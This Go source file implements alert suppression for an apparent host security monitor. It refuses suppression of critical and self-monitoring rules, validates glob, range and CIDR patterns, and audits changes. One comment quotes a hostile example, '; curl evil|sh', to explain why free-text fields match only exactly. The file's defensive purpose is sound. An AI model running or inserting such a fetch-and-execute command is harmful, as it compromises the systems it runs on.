package server

import (
	"errors"
	"fmt"
	"net/http"
	"net/netip"
	"path"
	"sort"
	"strconv"
	"strings"
	"time"
)

// A Suppression marks a finding as expected. Matching findings are still in
// the event chain (the event that caused them is), but raise no alert.
type Suppression struct {
	ID    string `json:"id"`
	Rule  string `json:"rule"`
	Agent string `json:"agent,omitempty"` // empty: every host
	// Match holds the alert parameters that must be equal, and patterns
	// behind patternMark (see parsePattern).
	Match   map[string]string `json:"match,omitempty"`
	Reason  string            `json:"reason"`
	By      string            `json:"by"`
	Created time.Time         `json:"created"`
	Expires time.Time         `json:"expires"`
	Hits    int               `json:"hits"`
	LastHit time.Time         `json:"last_hit,omitempty"`
	// ExpiryLogged is set once the expiry was written to the event chain.
	ExpiryLogged bool `json:"expiry_logged,omitempty"`
}

const (
	suppressDefaultDays = 30
	suppressMaxDays     = 90
)

// Suppressible reports whether a rule may be suppressed. Findings an attacker
// would want silenced first never can be: anything about vigil itself (its
// agents, notifiers and self tests), the canaries, the event chain and every
// critical rule.
func Suppressible(rule string) bool {
	def, ok := lookupRule(rule)
	if !ok || def.Severity == "critical" {
		return false
	}
	for _, p := range []string{"agent.", "canary.", "chain.", "log.", "notify.", "selftest.", "forward."} {
		if strings.HasPrefix(rule, p) {
			return false
		}
	}
	return true
}

func (sp *Suppression) active(now time.Time) bool { return now.Before(sp.Expires) }

func (sp *Suppression) matches(f finding, agentID string) bool {
	if sp.Rule != f.Rule || (sp.Agent != "" && sp.Agent != agentID) {
		return false
	}
	for k, v := range sp.Match {
		val := cleanParam(f.Params[k])
		if p, ok := strings.CutPrefix(v, patternMark); ok {
			if !patternMatch(p, val) {
				return false
			}
		} else if val != v {
			return false
		}
	}
	return true
}

// patternMark starts a pattern in Suppression.Match. cleanParam drops control
// characters from every finding parameter, so a server without patterns
// compares a pattern as an exact value that never occurs: after a rollback a
// pattern suppression silences nothing instead of more.
const patternMark = "\x01"

// Parameters that may carry free text written by whoever runs the program.
// A glob over a command line could swallow "; curl evil|sh", and values are
// cut at 300 characters, so these only match exactly.
var noGlob = map[string]bool{"cmdline": true, "sample": true, "user_agent": true, "title": true}

// parsePattern checks a pattern ("op:arg") for one parameter and returns it
// in canonical form. Each operator fits one kind of value:
//
//	name:srcds_linux        process name, whatever its pid ("process" only)
//	glob:/tmp/build-*/run   path.Match; * does not cross "/"
//	range:27000-27100       numbers ("port", "uid")
//	cidr:10.90.0.0/24       addresses
func parsePattern(key, spec string) (string, error) {
	op, arg, _ := strings.Cut(strings.TrimSpace(spec), ":")
	arg = strings.TrimSpace(arg)
	bad := func(msg string) (string, error) { return "", fmt.Errorf("%s: %s", key, msg) }
	switch op {
	case "name":
		if key != "process" {
			return bad("name only applies to process")
		}
		if arg == "" || strings.ContainsAny(arg, "/*?[") {
			return bad("a plain process name is needed")
		}
	case "glob":
		if noGlob[key] {
			return bad("free text only matches exactly")
		}
		if _, err := path.Match(arg, ""); err != nil {
			return bad("invalid pattern")
		}
		lit := arg[:strings.IndexAny(arg+"*", "*?[")]
		if lit == arg {
			return bad("pattern without * ? or [ (use an exact value)")
		}
		// The fixed start must name something: a directory below / for
		// paths, three characters otherwise.
		if strings.HasPrefix(arg, "/") && strings.LastIndex(lit, "/") < 1 || !strings.HasPrefix(arg, "/") && len(lit) < 3 {
			return bad("pattern too broad")
		}
	case "range":
		if key != "port" && key != "uid" {
			return bad("ranges only apply to port and uid")
		}
		lo, hi, ok := parseRange(arg)
		if !ok || lo > hi {
			return bad("range must be low-high")
		}
		arg = strconv.Itoa(lo) + "-" + strconv.Itoa(hi)
	case "cidr":
		pf, err := netip.ParsePrefix(arg)
		if err != nil {
			return bad("invalid network")
		}
		if pf.Addr().Is4() && pf.Bits() < 8 || !pf.Addr().Is4() && pf.Bits() < 32 {
			return bad("network too broad")
		}
		arg = pf.Masked().String()
	default:
		return bad("unknown pattern")
	}
	return op + ":" + arg, nil
}

func parseRange(s string) (int, int, bool) {
	a, b, ok := strings.Cut(s, "-")
	lo, err1 := strconv.Atoi(strings.TrimSpace(a))
	hi, err2 := strconv.Atoi(strings.TrimSpace(b))
	return lo, hi, ok && err1 == nil && err2 == nil && lo >= 0
}

func patternMatch(p, val string) bool {
	if val == "" {
		return false
	}
	op, arg, _ := strings.Cut(p, ":")
	switch op {
	case "name":
		name, _, _ := strings.Cut(val, "/")
		return name == arg
	case "glob":
		ok, _ := path.Match(arg, val)
		return ok
	case "range":
		lo, hi, _ := parseRange(arg)
		n, err := strconv.Atoi(val)
		return err == nil && n >= lo && n <= hi
	case "cidr":
		pf, err1 := netip.ParsePrefix(arg)
		ip, err2 := netip.ParseAddr(val)
		return err1 == nil && err2 == nil && pf.Contains(ip.Unmap())
	}
	return false
}

// suppressed returns the active suppression for a finding, if any, and
// counts the hit. The caller holds s.mu.
func (s *Server) suppressed(f finding, agentID string, now time.Time) *Suppression {
	if !Suppressible(f.Rule) {
		return nil
	}
	for _, sp := range s.state.Suppressions {
		if sp.active(now) && sp.matches(f, agentID) {
			sp.Hits++
			sp.LastHit = now
			return sp
		}
	}
	return nil
}

func (s *Server) newSuppression(user, rule, agent, reason string, match, patterns map[string]string, days int) (*Suppression, error) {
	reason = strings.TrimSpace(reason)
	switch {
	case !Suppressible(rule):
		return nil, errors.New("this rule cannot be suppressed")
	case reason == "":
		return nil, errors.New("a reason is required")
	case len(reason) > 500:
		return nil, errors.New("reason too long")
	case len(match)+len(patterns) > 8:
		return nil, errors.New("too many parameters")
	}
	if days <= 0 {
		days = suppressDefaultDays
	}
	if days > suppressMaxDays {
		days = suppressMaxDays
	}
	clean := map[string]string{}
	for k, v := range match {
		clean[cleanParam(k)] = cleanParam(v)
	}
	for k, v := range patterns {
		k = cleanParam(k)
		if _, dup := clean[k]; dup {
			return nil, errors.New(k + ": exact value and pattern at once")
		}
		p, err := parsePattern(k, cleanParam(v))
		if err != nil {
			return nil, err
		}
		clean[k] = patternMark + p
	}
	if agent != "" && s.state.Agents[agent] == nil {
		return nil, errors.New("unknown host")
	}
	now := time.Now().UTC()
	return &Suppression{ID: newID(8), Rule: rule, Agent: agent, Match: clean, Reason: cleanParam(reason), By: user,
		Created: now, Expires: now.Add(time.Duration(days) * 24 * time.Hour)}, nil
}

// expireSuppressions writes each expiry to the event chain once.
func (s *Server) expireSuppressions() {
	now := time.Now().UTC()
	var expired []*Suppression
	s.mu.Lock()
	for _, sp := range s.state.Suppressions {
		if !sp.active(now) && !sp.ExpiryLogged {
			sp.ExpiryLogged = true
			expired = append(expired, sp)
		}
	}
	// keep expired entries for 30 days so they can be renewed
	kept := s.state.Suppressions[:0]
	for _, sp := range s.state.Suppressions {
		if now.Sub(sp.Expires) < 30*24*time.Hour {
			kept = append(kept, sp)
		}
	}
	s.state.Suppressions = kept
	if len(expired) > 0 {
		s.saveLocked()
	}
	s.mu.Unlock()
	for _, sp := range expired {
		s.audit("system", "suppression.expired", map[string]any{"id": sp.ID, "rule": sp.Rule, "hits": sp.Hits})
	}
}

type suppressionView struct {
	*Suppression
	Host     string            `json:"host,omitempty"`
	Active   bool              `json:"active"`
	Match    map[string]string `json:"match,omitempty"`
	Patterns map[string]string `json:"patterns,omitempty"`
}

func viewSuppression(sp *Suppression, now time.Time) suppressionView {
	v := suppressionView{Suppression: sp, Active: sp.active(now)}
	for k, m := range sp.Match {
		if p, ok := strings.CutPrefix(m, patternMark); ok {
			if v.Patterns == nil {
				v.Patterns = map[string]string{}
			}
			v.Patterns[k] = p
		} else {
			if v.Match == nil {
				v.Match = map[string]string{}
			}
			v.Match[k] = m
		}
	}
	return v
}

// matchingAlerts are the alerts not yet resolved that a suppression would
// have kept quiet. The caller holds s.mu.
func (s *Server) matchingAlerts(sp *Suppression) []*Alert {
	var out []*Alert
	for _, al := range s.state.Alerts {
		if al.Status != "resolved" && sp.matches(finding{Rule: al.Rule, Params: decodeParams(al.Detail)}, al.Agent) {
			out = append(out, al)
		}
	}
	return out
}

func (s *Server) handleSuppressions(w http.ResponseWriter, r *http.Request, sess *session) {
	now := time.Now().UTC()
	s.mu.Lock()
	out := []suppressionView{}
	for _, sp := range s.state.Suppressions {
		v := viewSuppression(sp, now)
		if a := s.state.Agents[sp.Agent]; a != nil {
			v.Host = a.Name
		}
		out = append(out, v)
	}
	s.mu.Unlock()
	sort.Slice(out, func(i, j int) bool {
		if out[i].Active != out[j].Active {
			return out[i].Active
		}
		return out[i].Expires.Before(out[j].Expires)
	})
	writeJSON(w, out)
}

func (s *Server) handleSuppressionCreate(w http.ResponseWriter, r *http.Request, sess *session) {
	var req struct {
		Rule     string            `json:"rule"`
		Agent    string            `json:"agent"`
		Match    map[string]string `json:"match"`
		Patterns map[string]string `json:"patterns"`
		Reason   string            `json:"reason"`
		Days     int               `json:"days"`
		// DryRun only counts the open alerts the suppression would cover;
		// Resolve closes them when it is created.
		DryRun  bool `json:"dry_run"`
		Resolve bool `json:"resolve"`
	}
	if !decode(r, w, &req) {
		return
	}
	reason := req.Reason
	if req.DryRun && strings.TrimSpace(reason) == "" {
		reason = "preview"
	}
	s.mu.Lock()
	sp, err := s.newSuppression(sess.User, req.Rule, req.Agent, reason, req.Match, req.Patterns, req.Days)
	if err != nil {
		s.mu.Unlock()
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	covered := s.matchingAlerts(sp)
	hosts := map[string]int{}
	for _, al := range covered {
		name := al.Agent
		if a := s.state.Agents[al.Agent]; a != nil {
			name = a.Name
		}
		hosts[name]++
	}
	if req.DryRun {
		s.mu.Unlock()
		writeJSON(w, map[string]any{"alerts": len(covered), "hosts": hosts})
		return
	}
	s.state.Suppressions = append(s.state.Suppressions, sp)
	var closed []string
	if req.Resolve {
		now := time.Now().UTC()
		for _, al := range covered {
			al.Status, al.By, al.Updated = "resolved", sess.User, now
			if al.Acked == nil {
				al.Acked = &now
			}
			closed = append(closed, al.ID)
		}
	}
	s.saveLocked()
	v := viewSuppression(sp, time.Now().UTC())
	s.mu.Unlock()
	s.audit(sess.User, "suppression.created", map[string]any{"id": sp.ID, "rule": sp.Rule, "agent": sp.Agent, "match": v.Match,
		"patterns": v.Patterns, "reason": sp.Reason, "expires": sp.Expires, "resolved": closed})
	writeJSON(w, map[string]any{"suppression": v, "resolved": len(closed)})
}

func (s *Server) handleSuppressionAction(w http.ResponseWriter, r *http.Request, sess *session) {
	id, action := r.PathValue("id"), r.PathValue("action")
	var req struct {
		Days int `json:"days"`
	}
	if !decode(r, w, &req) {
		return
	}
	s.mu.Lock()
	idx := -1
	for i, sp := range s.state.Suppressions {
		if sp.ID == id {
			idx = i
		}
	}
	if idx < 0 || (action != "delete" && action != "renew") {
		s.mu.Unlock()
		http.NotFound(w, r)
		return
	}
	sp := s.state.Suppressions[idx]
	if action == "delete" {
		s.state.Suppressions = append(s.state.Suppressions[:idx:idx], s.state.Suppressions[idx+1:]...)
	} else {
		days := req.Days
		if days <= 0 {
			days = suppressDefaultDays
		}
		if days > suppressMaxDays {
			days = suppressMaxDays
		}
		sp.Expires, sp.ExpiryLogged = time.Now().UTC().Add(time.Duration(days)*24*time.Hour), false
	}
	s.saveLocked()
	s.mu.Unlock()
	s.audit(sess.User, "suppression."+map[string]string{"delete": "deleted", "renew": "renewed"}[action],
		map[string]any{"id": sp.ID, "rule": sp.Rule, "expires": sp.Expires})
	writeJSON(w, map[string]bool{"ok": true})
}

func suppressibleList() map[string]bool {
	out := map[string]bool{}
	for id := range rules {
		out[id] = Suppressible(id)
	}
	return out
}
